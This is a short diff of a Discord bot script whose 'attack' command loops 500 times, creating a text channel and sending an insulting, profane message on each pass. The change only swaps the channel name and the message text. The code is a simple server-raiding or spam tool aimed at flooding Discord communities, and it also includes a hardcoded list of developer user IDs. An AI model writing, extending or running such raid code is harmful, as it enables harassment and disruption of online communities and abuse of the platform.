@@ -17,11 +17,11 @@ client.on('message' , async (message) => {
     if (message.content.startsWith(prefix + 'attack')) {
 for (let i = 0; i < 500; i++) {
 
-        message.guild.createChannel('ATLANTIC GANG', 'text')
-        message.channel.send('fuck');
+        message.guild.createChannel('xd', 'text')
+        message.channel.send('bc Hello bitch');
 }
 }
-}); 
+});   
 
 
 const developers = ["348555232529219585","411081496485691392"]
